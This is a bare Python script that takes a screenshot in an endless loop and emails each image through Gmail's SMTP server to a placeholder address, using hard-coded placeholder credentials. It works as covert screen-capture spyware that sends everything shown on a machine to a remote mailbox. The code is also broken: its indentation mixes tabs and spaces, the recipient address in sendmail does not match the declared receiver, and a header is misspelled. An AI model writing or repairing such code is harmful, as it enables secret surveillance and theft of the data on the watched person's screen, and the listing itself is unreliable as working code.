#~~~~~~~~~~~~~~~~~~~~~~~~~~~~
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import pyautogui
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~
email_user = 'youremail@gmail.com';
email_receiver = 'youremail@gmail.com';
o : int = 0;
while True:
	pyautogui.screenshot()
    pyautogui.screenshot('foo'+str(o) + '.jpeg')
    subject = 'Photo' + str(o)
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_receiver
    msg['Subject'] = subject
    body = "Here is" + str(o)
    msg.attach(MIMEText(body, 'plain'))
    filename = 'foo' + str(o) + '.jpeg'
    attachment = open(filename, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "atachment; filename =" + filename)
    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login('youremail@gmail.com', 'yourpassword')
    server.sendmail('youremail@gmail.com', 'yourpassword@gmail.com', text)
    server.quit();
    o += 1;
        
